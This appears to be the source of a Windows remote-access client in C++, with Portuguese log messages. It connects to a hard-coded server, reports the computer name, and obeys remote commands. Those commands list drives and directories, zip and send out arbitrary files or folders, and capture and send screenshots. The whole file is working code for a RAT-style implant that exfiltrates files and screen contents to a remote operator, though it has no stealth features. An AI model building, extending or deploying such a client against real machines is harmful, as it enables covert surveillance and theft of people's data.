// Client.cpp
#define __IP_ "127.0.0.1"
#define __PORT_ 5555

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <thread>
#include <mutex>
#include <vector>
#include <sstream>
#include <fstream>
#include <iterator>
#include <gdiplus.h> 
#include <shlwapi.h>
#include <comdef.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;
namespace fs = std::filesystem;

bool sendAll(SOCKET sock, const char* data, int length) {
    int totalSent = 0;
    while (totalSent < length) {
        int sent = send(sock, data + totalSent, length - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            cerr << "send failed with error: " << WSAGetLastError() << endl;
            return false;
        }
        totalSent += sent;
    }
    return true;
}

bool sendMessage(SOCKET sock, const string& message) {
    uint32_t len = htonl(static_cast<uint32_t>(message.size()));
    if (!sendAll(sock, reinterpret_cast<char*>(&len), sizeof(len))) {
        return false;
    }
    if (!sendAll(sock, message.c_str(), message.size())) {
        return false;
    }
    return true;
}

bool recvMessage(SOCKET sock, string& message) {
    uint32_t len = 0;
    int bytesReceived = recv(sock, reinterpret_cast<char*>(&len), sizeof(len), 0);
    if (bytesReceived == 0) {
        return false;
    }
    if (bytesReceived < 0) {
        cerr << "recv failed with error: " << WSAGetLastError() << endl;
        return false;
    }
    if (bytesReceived != sizeof(len)) {
        cerr << "Incomplete length received." << endl;
        return false;
    }
    len = ntohl(len);
    string buffer(len, '\0');
    int totalReceived = 0;
    while (totalReceived < len) {
        int received = recv(sock, &buffer[totalReceived], len - totalReceived, 0);
        if (received <= 0) {
            cerr << "recv failed or connection closed." << endl;
            return false;
        }
        totalReceived += received;
    }
    message = buffer;
    return true;
}

class MemoryBuffer {
public:
    vector<char> buffer;

    void write(const char* data, size_t size) {
        buffer.insert(buffer.end(), data, data + size);
    }

    string getBuffer() const {
        return string(buffer.begin(), buffer.end());
    }
};

std::chrono::system_clock::time_point file_time_to_system_time(const fs::file_time_type& file_time) {
    auto sctp = std::chrono::system_clock::now() +
        (file_time - fs::file_time_type::clock::now());
    return sctp;
}

uint32_t dos_time_date(const std::chrono::system_clock::time_point& tp) {
    std::time_t t = std::chrono::system_clock::to_time_t(tp);
    std::tm tm;
#ifdef _WIN32
    localtime_s(&tm, &t);
#else
    localtime_r(&t, &tm);
#endif
    uint16_t dos_date = ((tm.tm_year - 80) << 9) | ((tm.tm_mon + 1) << 5) | tm.tm_mday;
    uint16_t dos_time = (tm.tm_hour << 11) | (tm.tm_min << 5) | (tm.tm_sec / 2);
    return (dos_date << 16) | dos_time;
}

struct ZipEntry {
    std::string filename;
    std::vector<uint8_t> data;
    uint32_t crc32;
    std::streampos offset;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint32_t dos_time_date;
};

uint32_t calculate_crc32(const std::vector<uint8_t>& data) {
    uint32_t crc = 0xFFFFFFFF;
    for (auto byte : data) {
        crc ^= byte;
        for (int i = 0; i < 8; ++i) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xEDB88320;
            else
                crc >>= 1;
        }
    }
    return crc ^ 0xFFFFFFFF;
}

bool add_file_to_entries(const fs::path& file_path, std::vector<ZipEntry>& entries) {
    if (!fs::is_regular_file(file_path)) {
        std::cerr << "O caminho especificado não é um arquivo regular: " << file_path << "\n";
        return false;
    }

    ZipEntry entry;
    entry.filename = file_path.filename().string();

    std::ifstream file(file_path, std::ios::binary);
    if (!file) {
        std::cerr << "Não foi possível abrir o arquivo: " << entry.filename << "\n";
        return false;
    }

    if (!file.is_open()) {
        std::cerr << "Não foi possível abrir o arquivo: " << entry.filename << "\n";
        return false;
    }

    entry.data = std::vector<uint8_t>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    entry.uncompressed_size = entry.data.size();
    entry.compressed_size = entry.uncompressed_size;
    entry.crc32 = calculate_crc32(entry.data);

    auto file_time = fs::last_write_time(file_path);
    auto system_time = file_time_to_system_time(file_time);
    entry.dos_time_date = dos_time_date(system_time);

    entries.push_back(entry);
    return true;
}

bool captureScreenToPNG(vector<BYTE>& pngData) {
    IStream* pStream = SHCreateMemStream(NULL, 0);
    if (pStream == NULL) {
        cerr << "Falha ao criar stream com SHCreateMemStream.\n";
        return false;
    }

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::Status gdiplusStatus = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (gdiplusStatus != Gdiplus::Ok) {
        cerr << "Falha ao inicializar GDI+. Status: " << gdiplusStatus << endl;
        CoUninitialize();
        return false;
    }

    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        cerr << "Falha ao obter HDC da tela.\n";
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        cerr << "Falha ao criar DC compatível.\n";
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        cerr << "Falha ao criar bitmap compatível.\n";
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    SelectObject(hMemoryDC, hBitmap);

    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
        cerr << "Falha ao copiar a tela para o bitmap.\n";
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    if (bitmap.GetLastStatus() != Gdiplus::Ok) {
        cerr << "Falha ao criar bitmap GDI+.\n";
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    CLSID pngClsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);
    Gdiplus::Status status = bitmap.Save(pStream, &pngClsid, NULL);
    if (status != Gdiplus::Ok) {
        cerr << "Falha ao salvar bitmap como PNG. Status: " << status << endl;
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    STATSTG statstg;
    if (pStream->Stat(&statstg, STATFLAG_NONAME) != S_OK) {
        cerr << "Falha ao obter estatísticas da stream.\n";
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    pngData.resize(static_cast<size_t>(statstg.cbSize.QuadPart));

    LARGE_INTEGER liZero = {};
    auto hr = pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
    if (FAILED(hr)) {
        cerr << "Falha ao buscar para o início do stream. HRESULT: " << hex << hr << endl;
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    ULONG bytesRead = 0;
    hr = pStream->Read(pngData.data(), static_cast<ULONG>(pngData.size()), &bytesRead);
    if (FAILED(hr) || bytesRead != pngData.size()) {
        cerr << "Falha ao ler dados do stream. HRESULT: " << hex << hr << endl;
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        CoUninitialize();
        return false;
    }

    pStream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    Gdiplus::GdiplusShutdown(gdiplusToken);
    CoUninitialize();

    return true;
}

int main() {
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) {
        cerr << "Falha ao inicializar GDI+\n";
        return 1;
    }

    WSADATA wsaData;
    int wsaStartup = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaStartup != 0) {
        cerr << "WSAStartup failed with error: " << wsaStartup << endl;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        cerr << "socket failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(__PORT_);
    inet_pton(AF_INET, __IP_, &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "connect failed with error: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    char computerName[256];
    DWORD size = sizeof(computerName);
    if (!GetComputerNameA(computerName, &size)) {
        cerr << "Failed to get computer name.\n";
        closesocket(sock);
        WSACleanup();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    string clientName(computerName, size);
    if (!sendMessage(sock, clientName)) {
        cerr << "Failed to send computer name to server.\n";
        closesocket(sock);
        WSACleanup();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    cout << "Connected to server. Computer Name: " << clientName << endl;

    string receivedCommand;
    mutex sendMutex;

    thread([&]() {
        while (recvMessage(sock, receivedCommand)) {
            cout << "[DEBUG] Received command from server: " << receivedCommand << endl;

            if (receivedCommand == "list drives") {
                char drivesBuffer[4096] = { 0 };
                DWORD len = GetLogicalDriveStringsA(4096, drivesBuffer);
                string drives(drivesBuffer, len);
                if (!sendMessage(sock, drives)) {
                    cerr << "Failed to send drives list to server.\n";
                    break;
                }
                cout << "[DEBUG] Sent drives list to server.\n";
            }
            else if (receivedCommand.find("list current directory ") == 0) {
                string dir = receivedCommand.substr(strlen("list current directory "));
                cout << "Listando diretório: " << dir << endl;

                string listing;
                try {
                    for (const auto& entry : fs::directory_iterator(dir)) {
                        listing += entry.path().filename().string() + "\n";
                    }
                }
                catch (const exception& e) {
                    listing = string("Failed to list directory: ") + e.what() + "\n";
                }

                if (!sendMessage(sock, listing)) {
                    cerr << "Failed to send directory listing to server.\n";
                    break;
                }
                cout << "[DEBUG] Sent directory listing to server.\n";
            }
            else if (receivedCommand.find("current user download ") == 0) {
                string prefix = "current user download ";
                if (receivedCommand.size() <= prefix.size()) {
                    cerr << "Comando de download inválido.\n";
                    continue;
                }
                string path = receivedCommand.substr(prefix.size());
                if (path.empty()) {
                    cerr << "Caminho para download está vazio.\n";
                    continue;
                }

                cout << "Iniciando download do caminho: " << path << "\n";

                fs::path input_path(path);

                if (!fs::exists(input_path)) {
                    string errorMsg = "Caminho especificado não existe: " + path;
                    cerr << errorMsg << "\n";
                    sendMessage(sock, errorMsg);
                    continue;
                }

                std::vector<ZipEntry> entries;

                if (fs::is_regular_file(input_path)) {
                    if (!add_file_to_entries(input_path, entries)) {
                        string errorMsg = "Falha ao adicionar o arquivo ao ZIP: " + input_path.string();
                        cerr << errorMsg << "\n";
                        sendMessage(sock, errorMsg);
                        continue;
                    }
                }
                else if (fs::is_directory(input_path)) {
                    for (auto& p : fs::directory_iterator(input_path)) {
                        if (fs::is_regular_file(p.status())) {
                            if (!add_file_to_entries(p.path(), entries)) {
                                continue;
                            }
                        }
                    }
                }
                else {
                    string errorMsg = "O caminho especificado não é um arquivo ou diretório válido: " + path;
                    cerr << errorMsg << "\n";
                    sendMessage(sock, errorMsg);
                    continue;
                }

                if (entries.empty()) {
                    string errorMsg = "Nenhum arquivo para compactar no caminho: " + path;
                    cerr << errorMsg << "\n";
                    sendMessage(sock, errorMsg);
                    continue;
                }

                MemoryBuffer zipBuffer;

                std::vector<std::streampos> central_directory_offsets;

                for (auto& entry : entries) {
                    entry.offset = zipBuffer.buffer.size();
                    zipBuffer.write("\x50\x4B\x03\x04", 4);
                    uint16_t version_needed = 20;
                    zipBuffer.write(reinterpret_cast<char*>(&version_needed), 2);
                    uint16_t gp_flag = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&gp_flag), 2);
                    uint16_t compression_method = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&compression_method), 2);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.dos_time_date), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.crc32), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.compressed_size), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.uncompressed_size), 4);
                    uint16_t filename_length = entry.filename.size();
                    zipBuffer.write(reinterpret_cast<char*>(&filename_length), 2);
                    uint16_t extra_length = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&extra_length), 2);
                    zipBuffer.write(entry.filename.c_str(), entry.filename.size());
                    zipBuffer.write(reinterpret_cast<char*>(entry.data.data()), entry.data.size());

                    central_directory_offsets.push_back(entry.offset);
                }

                std::streampos central_directory_start = zipBuffer.buffer.size();

                std::streamoff central_directory_size = 0;
                for (size_t i = 0; i < entries.size(); ++i) {
                    auto& entry = entries[i];
                    zipBuffer.write("\x50\x4B\x01\x02", 4);
                    uint16_t version_made_by = 20;
                    zipBuffer.write(reinterpret_cast<char*>(&version_made_by), 2);
                    uint16_t version_needed_extract = 20;
                    zipBuffer.write(reinterpret_cast<char*>(&version_needed_extract), 2);
                    uint16_t gp_flag = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&gp_flag), 2);
                    uint16_t compression_method = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&compression_method), 2);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.dos_time_date), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.crc32), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.compressed_size), 4);
                    zipBuffer.write(reinterpret_cast<char*>(&entry.uncompressed_size), 4);
                    uint16_t filename_length = entry.filename.size();
                    zipBuffer.write(reinterpret_cast<char*>(&filename_length), 2);
                    uint16_t extra_length = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&extra_length), 2);
                    uint16_t comment_length = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&comment_length), 2);
                    uint16_t disk_number = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&disk_number), 2);
                    uint16_t internal_attr = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&internal_attr), 2);
                    uint32_t external_attr = 0;
                    zipBuffer.write(reinterpret_cast<char*>(&external_attr), 4);
                    uint32_t relative_offset = static_cast<uint32_t>(entry.offset);
                    zipBuffer.write(reinterpret_cast<char*>(&relative_offset), 4);
                    zipBuffer.write(entry.filename.c_str(), entry.filename.size());
                }

                central_directory_size = zipBuffer.buffer.size() - central_directory_start;

                zipBuffer.write("\x50\x4B\x05\x06", 4);
                uint16_t disk_number = 0;
                zipBuffer.write(reinterpret_cast<char*>(&disk_number), 2);
                zipBuffer.write(reinterpret_cast<char*>(&disk_number), 2);
                uint16_t total_entries = entries.size();
                zipBuffer.write(reinterpret_cast<char*>(&total_entries), 2);
                zipBuffer.write(reinterpret_cast<char*>(&total_entries), 2);
                uint32_t cd_size = static_cast<uint32_t>(central_directory_size);
                zipBuffer.write(reinterpret_cast<char*>(&cd_size), 4);
                uint32_t central_directory_start_offset = static_cast<uint32_t>(central_directory_start);
                zipBuffer.write(reinterpret_cast<char*>(&central_directory_start_offset), 4);
                uint16_t comment_len = 0;
                zipBuffer.write(reinterpret_cast<char*>(&comment_len), 2);

                string zipData = zipBuffer.getBuffer();

                if (!sendMessage(sock, zipData)) {
                    cerr << "Failed to send ZIP data to server.\n";
                    break;
                }
                cout << "[DEBUG] Sent ZIP data to server.\n";
            }
            else if (receivedCommand.find("current user screenshot") == 0) {
                cout << "Capturando screenshot...\n";
                vector<BYTE> pngBytes;
                if (!captureScreenToPNG(pngBytes)) {
                    string errorMsg = "Falha ao capturar screenshot.";
                    cerr << errorMsg << "\n";
                    sendMessage(sock, errorMsg);
                    continue;
                }

                string pngData(reinterpret_cast<char*>(pngBytes.data()), pngBytes.size());
                if (!sendMessage(sock, pngData)) {
                    cerr << "Falha ao enviar PNG para o servidor.\n";
                    break;
                }
                cout << "[DEBUG] Sent PNG data to server.\n";
            }
            else {
                cout << "Comando desconhecido recebido do servidor: " << receivedCommand << endl;
            }
        }
        cout << "Servidor desconectou ou ocorreu um erro.\n";
        closesocket(sock);
        WSACleanup();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        exit(0);
        }).detach();

    while (true) {
        this_thread::sleep_for(chrono::seconds(1));
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
}